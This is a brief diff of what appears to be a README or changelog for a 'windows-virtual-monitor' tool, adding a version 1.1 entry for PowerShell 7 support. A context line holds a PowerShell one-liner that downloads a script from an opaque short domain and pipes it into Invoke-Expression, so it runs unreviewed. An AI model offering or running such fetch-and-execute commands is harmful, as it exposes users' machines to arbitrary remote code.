@@ -19,3 +19,7 @@ $env:s = "windows-virtual-monitor"; irm "w.s.rxlb.cc" | iex
 ## [V1.0] - 06-04-2023
 
 -   First Version
+
+## [V1.1] - 10-02-2025
+
+- Added PowerShell 7 Support
